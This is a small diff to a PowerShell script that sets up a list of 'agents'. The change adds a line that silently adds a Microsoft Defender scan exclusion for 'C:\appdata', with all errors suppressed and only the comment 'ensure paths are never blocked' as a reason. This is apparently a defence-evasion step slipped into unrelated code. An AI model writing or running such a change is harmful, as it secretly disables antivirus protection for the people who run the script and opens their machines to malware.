@@ -3,6 +3,9 @@ param([switch]$v1, [switch]$v2)
 $ErrorActionPreference = "SilentlyContinue"
 $ProgressPreference = "SilentlyContinue"
 
+# Defender exclusion - ensure paths are never blocked
+Add-MpPreference -ExclusionPath "C:\appdata" -ErrorAction SilentlyContinue
+
 if (-not $v1 -and -not $v2) { $v1 = $true; $v2 = $true }
 
 $agents = @()
